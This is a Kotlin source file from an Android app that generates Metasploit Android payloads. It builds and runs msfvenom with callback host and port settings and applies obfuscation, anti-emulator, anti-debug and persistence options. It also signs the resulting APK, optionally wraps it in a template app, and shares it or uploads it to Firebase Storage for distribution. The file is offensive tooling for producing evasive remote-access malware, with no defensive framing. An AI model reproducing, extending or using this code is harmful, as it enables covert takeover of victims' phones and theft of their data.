package com.Azelmods.App.data.security.payload

import android.content.Context
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.withContext
import kotlinx.coroutines.tasks.await
import java.io.File
import java.security.MessageDigest
import java.util.UUID
import javax.inject.Inject
import javax.inject.Singleton

/**
 * Implementation of PayloadGenerator
 * 
 * Handles complete payload generation workflow:
 * 1. Configuration validation
 * 2. msfvenom execution
 * 3. Advanced obfuscation (if enabled)
 * 4. APK signing
 * 5. Hash calculation
 * 6. Database persistence
 * 
 * Requirements: 7.1, 7.2, 7.3, 7.4, 7.5, 7.6, 7.7, 24.1, 24.2, 24.3, 24.4, 24.5, 24.6
 */
@Singleton
class PayloadGeneratorImpl @Inject constructor(
    private val context: Context,
    private val msfvenomWrapper: MsfvenomWrapper,
    private val validator: PayloadConfigValidator,
    private val obfuscationEngine: AdvancedObfuscationEngine,
    private val apkSigner: ApkSigner,
    private val payloadDatabase: PayloadDatabase
) : PayloadGenerator {
    
    companion object {
        private const val TAG = "PayloadGeneratorImpl"
        private const val PAYLOADS_DIR = "payloads"
        private const val MAX_PAYLOAD_AGE_DAYS = 30
        private const val MIN_FREE_SPACE_MB = 100L
    }
    
    private val payloadsDirectory: File by lazy {
        File(context.filesDir, PAYLOADS_DIR).apply {
            if (!exists()) {
                mkdirs()
            }
        }
    }
    
    init {
        // Perform automatic cleanup on initialization
        cleanupOldPayloads()
    }
    
    override fun generatePayload(config: PayloadConfig): Flow<PayloadGenerationState> = flow {
        try {
            // Check storage space before generation
            if (!hasEnoughStorageSpace()) {
                emit(PayloadGenerationState.Error(
                    message = "Insufficient storage space",
                    suggestion = "Free up at least ${MIN_FREE_SPACE_MB}MB or delete old payloads from Payload History"
                ))
                return@flow
            }
            
            // Phase 1: Validation (0-10%)
            emit(PayloadGenerationState.Validating("Validating configuration..."))
            
            val validationResult = validator.validate(config)
            if (validationResult is ValidationResult.Invalid) {
                val errorMessage = validationResult.errors.joinToString("\n") { it.message }
                emit(PayloadGenerationState.Error(
                    message = "Configuration validation failed",
                    suggestion = errorMessage
                ))
                return@flow
            }
            
            // Check if msfvenom binary exists
            if (!msfvenomWrapper.isMsfvenomAvailable()) {
                emit(PayloadGenerationState.Error(
                    message = "msfvenom binary not found",
                    suggestion = "Install Metasploit Framework via Termux:\n" +
                            "1. Install Termux from F-Droid\n" +
                            "2. Run: pkg install metasploit\n" +
                            "3. Verify: msfvenom --version"
                ))
                return@flow
            }
            
            // Phase 2: Generation (10-50%)
            val payloadId = UUID.randomUUID().toString()
            val rawFileName = "payload_${payloadId}_raw.apk"
            val rawFile = File(payloadsDirectory, rawFileName)
            
            emit(PayloadGenerationState.Generating(10, "Building msfvenom command..."))
            
            val command = msfvenomWrapper.buildMsfvenomCommand(config, rawFile.absolutePath)
            
            emit(PayloadGenerationState.Generating(15, "Executing msfvenom..."))
            
            // Set timeout for msfvenom execution (5 minutes)
            val executionResult = withContext(Dispatchers.IO) {
                try {
                    kotlinx.coroutines.withTimeout(5 * 60 * 1000L) {
                        msfvenomWrapper.executeCommand(command) { progress, message ->
                            // Map msfvenom progress (0-90) to generation phase (15-50)
                            val mappedProgress = 15 + (progress * 0.35).toInt()
                            // Emit progress update (note: can't emit from callback directly in Flow)
                        }
                    }
                } catch (e: kotlinx.coroutines.TimeoutCancellationException) {
                    ExecutionResult.Error("Generation timeout after 5 minutes. Try using lower obfuscation level or simpler payload type.")
                }
            }
            
            if (executionResult is ExecutionResult.Error) {
                emit(PayloadGenerationState.Error(
                    message = "Payload generation failed",
                    suggestion = executionResult.message
                ))
                return@flow
            }
            
            if (!rawFile.exists() || rawFile.length() == 0L) {
                emit(PayloadGenerationState.Error(
                    message = "Generated payload file is empty or missing",
                    suggestion = "Check msfvenom installation:\n" +
                            "1. Run: msfvenom --version\n" +
                            "2. Verify Metasploit is properly installed\n" +
                            "3. Check available disk space"
                ))
                return@flow
            }
            
            emit(PayloadGenerationState.Generating(50, "Payload generated successfully"))
            
            // Phase 3: Obfuscation (50-70%)
            var finalFile = rawFile
            
            if (config.obfuscationLevel != ObfuscationLevel.NONE ||
                config.enableAntiEmulator ||
                config.enableAntiDebug ||
                config.enablePersistence) {
                
                emit(PayloadGenerationState.Obfuscating(50, "Applying obfuscation..."))
                
                val obfuscatedFileName = "payload_${payloadId}_obfuscated.apk"
                val obfuscatedFile = File(payloadsDirectory, obfuscatedFileName)
                
                // Check if template APK is needed for high obfuscation
                if (config.obfuscationLevel == ObfuscationLevel.HIGH || 
                    config.obfuscationLevel == ObfuscationLevel.EXTREME) {
                    if (config.templateApkPath == null) {
                        emit(PayloadGenerationState.Error(
                            message = "Template APK required for high obfuscation",
                            suggestion = "Provide a template APK or use Medium obfuscation level or lower"
                        ))
                        rawFile.delete()
                        return@flow
                    }
                }
                
                val obfuscationResult = try {
                    obfuscationEngine.obfuscate(
                        inputApk = rawFile,
                        outputApk = obfuscatedFile,
                        config = config
                    ) { progress, message ->
                        // Map obfuscation progress (0-100) to obfuscation phase (50-70)
                        val mappedProgress = 50 + (progress * 0.20).toInt()
                        // Emit progress update
                    }
                } catch (e: Exception) {
                    ObfuscationResult.Error("Obfuscation failed: ${e.message}. Try using lower obfuscation level.")
                }
                
                if (obfuscationResult is ObfuscationResult.Success) {
                    finalFile = obfuscatedFile
                    // Clean up raw file
                    rawFile.delete()
                    emit(PayloadGenerationState.Obfuscating(70, "Obfuscation completed"))
                } else if (obfuscationResult is ObfuscationResult.Error) {
                    emit(PayloadGenerationState.Error(
                        message = "Obfuscation failed",
                        suggestion = obfuscationResult.message
                    ))
                    rawFile.delete()
                    return@flow
                }
            }
            
            // Phase 4: Signing (70-85%)
            emit(PayloadGenerationState.Signing(70, "Signing APK..."))
            
            val signedFileName = "payload_${payloadId}.apk"
            val signedFile = File(payloadsDirectory, signedFileName)
            
            val signingResult = try {
                apkSigner.signApk(finalFile, signedFile)
            } catch (e: Exception) {
                SigningResult.Error("APK signing failed: ${e.message}. Regenerating keystore may help.")
            }
            
            if (signingResult is SigningResult.Error) {
                emit(PayloadGenerationState.Error(
                    message = "APK signing failed",
                    suggestion = signingResult.message + "\n\nTry:\n" +
                            "1. Clear app data to regenerate keystore\n" +
                            "2. Check file permissions\n" +
                            "3. Ensure APK is not corrupted"
                ))
                finalFile.delete()
                return@flow
            }
            
            // Clean up unsigned file if different
            if (finalFile != signedFile) {
                finalFile.delete()
            }
            
            emit(PayloadGenerationState.Signing(85, "APK signed successfully"))
            
            // Phase 5: Finalization (85-100%)
            emit(PayloadGenerationState.Signing(90, "Calculating hash..."))
            
            val sha256Hash = calculateSHA256(signedFile)
            
            emit(PayloadGenerationState.Signing(95, "Saving to database..."))
            
            val generatedPayload = GeneratedPayload(
                id = payloadId,
                type = config.type,
                lhost = config.lhost,
                lport = config.lport,
                obfuscationLevel = config.obfuscationLevel,
                filePath = signedFile.absolutePath,
                fileName = signedFileName,
                fileSize = signedFile.length(),
                sha256Hash = sha256Hash,
                timestamp = System.currentTimeMillis(),
                customPackageName = config.customPackageName,
                hasAntiEmulator = config.enableAntiEmulator,
                hasAntiDebug = config.enableAntiDebug,
                hasPersistence = config.enablePersistence
            )
            
            // Save to database
            payloadDatabase.insertPayload(generatedPayload)
            
            emit(PayloadGenerationState.Success(generatedPayload))
            
            Log.d(TAG, "Payload generated successfully: $payloadId")
            
        } catch (e: Exception) {
            Log.e(TAG, "Error generating payload", e)
            emit(PayloadGenerationState.Error(
                message = "Unexpected error: ${e.message}",
                suggestion = "Check logs for details. If the problem persists:\n" +
                        "1. Restart the app\n" +
                        "2. Clear app cache\n" +
                        "3. Verify Metasploit installation"
            ))
        }
    }
    
    override fun getAvailablePayloadTypes(): List<PayloadType> {
        return PayloadType.values().toList()
    }
    
    override fun getPayloadHistory(): Flow<List<GeneratedPayload>> {
        return payloadDatabase.getAllPayloads()
    }
    
    override suspend fun deletePayload(payloadId: String) = withContext(Dispatchers.IO) {
        try {
            val payload = payloadDatabase.getPayloadById(payloadId)
            
            if (payload != null) {
                // Delete file
                val file = File(payload.filePath)
                if (file.exists()) {
                    file.delete()
                    Log.d(TAG, "Deleted payload file: ${payload.fileName}")
                }
                
                // Delete from database
                payloadDatabase.deletePayload(payloadId)
                Log.d(TAG, "Deleted payload from database: $payloadId")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error deleting payload", e)
            throw e
        }
    }
    
    override suspend fun sharePayload(payloadId: String) {
        withContext(Dispatchers.IO) {
            try {
                val payload = payloadDatabase.getPayloadById(payloadId)
                    ?: throw IllegalArgumentException("Payload not found: $payloadId")
                
                val file = File(payload.filePath)
                if (!file.exists()) {
                    throw IllegalStateException("Payload file not found: ${payload.fileName}")
                }
                
                // Create content URI using FileProvider
                val uri = androidx.core.content.FileProvider.getUriForFile(
                    context,
                    "${context.packageName}.fileprovider",
                    file
                )
                
                // Create share intent
                val shareIntent = android.content.Intent(android.content.Intent.ACTION_SEND).apply {
                    type = "application/vnd.android.package-archive"
                    putExtra(android.content.Intent.EXTRA_STREAM, uri)
                    putExtra(android.content.Intent.EXTRA_SUBJECT, "Nexus Chat Payload: ${payload.fileName}")
                    putExtra(android.content.Intent.EXTRA_TEXT, """
                        Payload Details:
                        Type: ${payload.type.displayName}
                        LHOST: ${payload.lhost}
                        LPORT: ${payload.lport}
                        Obfuscation: ${payload.obfuscationLevel.name}
                        Size: ${payload.fileSize / 1024} KB
                        SHA256: ${payload.sha256Hash}
                    """.trimIndent())
                    addFlags(android.content.Intent.FLAG_GRANT_READ_URI_PERMISSION)
                    addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                
                // Start share chooser
                val chooser = android.content.Intent.createChooser(shareIntent, "Share Payload")
                    .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                
                context.startActivity(chooser)
                
                Log.d(TAG, "Share intent launched for payload: ${payload.fileName}")
                
            } catch (e: Exception) {
                Log.e(TAG, "Error sharing payload", e)
                throw e
            }
        }
    }
    
    override suspend fun uploadPayloadToFirebase(payloadId: String): String = withContext(Dispatchers.IO) {
        try {
            val payload = payloadDatabase.getPayloadById(payloadId)
                ?: throw IllegalArgumentException("Payload not found: $payloadId")
            
            val file = File(payload.filePath)
            if (!file.exists()) {
                throw IllegalStateException("Payload file not found: ${payload.fileName}")
            }
            
            // Get Firebase Storage instance
            val storage = com.google.firebase.storage.FirebaseStorage.getInstance()
            val storageRef = storage.reference
            
            // Get current user ID
            val userId = com.google.firebase.auth.FirebaseAuth.getInstance().currentUser?.uid
                ?: throw IllegalStateException("User not authenticated")
            
            // Create storage path: payloads/{userId}/{payloadId}.apk
            val payloadRef = storageRef.child("payloads/$userId/${payloadId}.apk")
            
            // Upload file
            val uploadTask = payloadRef.putFile(android.net.Uri.fromFile(file))
            
            // Wait for upload to complete
            val uploadResult = uploadTask.await()
            
            if (uploadResult.task.isSuccessful) {
                // Get download URL
                val downloadUrl = payloadRef.downloadUrl.await()
                val downloadUrlString = downloadUrl.toString()
                
                // Update payload in database with Firebase URL
                val updatedPayload = payload.copy(firebaseUrl = downloadUrlString)
                payloadDatabase.updatePayload(updatedPayload)
                
                Log.d(TAG, "Payload uploaded to Firebase: $downloadUrlString")
                
                return@withContext downloadUrlString
            } else {
                throw Exception("Upload failed: ${uploadResult.task.exception?.message}")
            }
            
        } catch (e: Exception) {
            Log.e(TAG, "Error uploading payload to Firebase", e)
            throw Exception("Firebase upload failed: ${e.message}", e)
        }
    }
    
    /**
     * Calculates SHA256 hash of a file
     */
    private suspend fun calculateSHA256(file: File): String = withContext(Dispatchers.IO) {
        val digest = MessageDigest.getInstance("SHA-256")
        file.inputStream().use { input ->
            val buffer = ByteArray(8192)
            var bytesRead: Int
            while (input.read(buffer).also { bytesRead = it } != -1) {
                digest.update(buffer, 0, bytesRead)
            }
        }
        digest.digest().joinToString("") { "%02x".format(it) }
    }
    
    /**
     * Checks if there is enough storage space for payload generation
     * Requirements: 22.4
     */
    private fun hasEnoughStorageSpace(): Boolean {
        val freeSpaceMB = payloadsDirectory.usableSpace / (1024 * 1024)
        return freeSpaceMB >= MIN_FREE_SPACE_MB
    }
    
    /**
     * Automatically cleans up payloads older than 30 days
     * Requirements: 37.4, 37.5
     */
    private fun cleanupOldPayloads() {
        try {
            val currentTime = System.currentTimeMillis()
            val maxAge = MAX_PAYLOAD_AGE_DAYS * 24 * 60 * 60 * 1000L
            
            // Get all payloads from database
            val allPayloads = payloadDatabase.getAllPayloadsSync()
            
            allPayloads.forEach { payload ->
                val age = currentTime - payload.timestamp
                if (age > maxAge) {
                    // Delete old payload
                    val file = File(payload.filePath)
                    if (file.exists()) {
                        file.delete()
                        Log.d(TAG, "Cleaned up old payload: ${payload.fileName}")
                    }
                    payloadDatabase.deletePayload(payload.id)
                }
            }
            
            Log.d(TAG, "Automatic cleanup completed")
        } catch (e: Exception) {
            Log.e(TAG, "Error during automatic cleanup", e)
        }
    }
    
    /**
     * Gets the total size of all payloads
     * Requirements: 22.3
     */
    fun getTotalPayloadSize(): Long {
        return payloadsDirectory.walkTopDown()
            .filter { it.isFile && it.extension == "apk" }
            .sumOf { it.length() }
    }
    
    /**
     * Gets available storage space in MB
     * Requirements: 22.4
     */
    fun getAvailableStorageSpaceMB(): Long {
        return payloadsDirectory.usableSpace / (1024 * 1024)
    }
}
